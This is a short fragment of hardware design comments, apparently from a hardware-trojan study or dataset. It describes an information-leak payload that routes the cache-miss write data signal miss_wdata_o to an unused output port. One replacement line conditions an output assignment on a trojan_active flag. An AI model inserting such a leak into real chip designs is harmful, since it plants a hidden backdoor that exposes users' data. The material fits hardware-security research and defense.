 ...
 * Payload: Route miss_wdata_o to leak port
 * 
...
// ============================================================
// Information Leak: Route miss_wdata_o to unused output
//
...
//   Replace: assign output_signal = trojan_active ? miss_wdata_o : normal_value;